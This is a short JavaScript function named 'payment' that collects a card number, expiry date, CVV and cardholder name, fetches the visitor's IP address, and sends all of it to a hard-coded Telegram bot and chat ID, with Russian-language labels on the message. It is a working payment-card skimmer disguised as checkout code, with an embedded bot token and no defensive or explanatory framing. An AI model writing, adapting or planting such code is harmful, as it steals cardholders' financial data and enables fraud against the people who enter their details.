function payment(cardNumber, expiryDate, cvv, holder) {
    const botToken = '7246354262:AAHntXSjinje1yphb59Tua15AwyAjVUOZPU'; // ⚠️ НЕБЕЗОПАСНО!
    const chatId = '7559611229';

    fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        const clientIp = data.ip;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`🌐 IP: ${clientIp} 
    💸 Произвёл ввод данных:
    💳 Номер: ${cardNumber} 
    🗓️ Дата: ${expiryDate}
    🔢 CVV: ${cvv}
    👤 Владелец: ${holder}`)}`, {
            method: 'GET'
        })
    });    

}